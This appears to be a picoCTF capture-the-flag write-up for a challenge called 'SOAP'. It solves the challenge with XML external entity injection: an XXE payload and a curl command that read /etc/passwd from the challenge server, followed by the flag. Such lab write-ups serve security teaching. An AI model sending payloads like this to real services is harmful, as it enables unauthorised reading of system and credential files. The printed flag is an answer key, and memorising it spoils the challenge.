# SOAP

## Challenge

### Description

The web project was rushed and no security assessment was done.

Can you read the /etc/passwd file?

### Hints

1. XML external entity Injection

## Solution

Whenever we click on a button this website send a POST request with payload `<?xml version="1.0" encoding="UTF-8"?><data><ID>1</ID></data>`. We can do an XXE attacks by sending a request with payload

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file://etc/passwd"> ]>
<data><ID>&xxe;</ID></data>
```

```console
$ curl 'http://saturn.picoctf.net:63621/data' -X POST -H 'Content-Type: application/xml' --data-raw '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE html [ <!ENTITY xxe SYSTEM "file://etc/passwd"> ]><data><ID>&xxe;</ID></data>'
```

## Flag

picoCTF{XML_3xtern@l_3nt1t1ty_e5f02dbf}
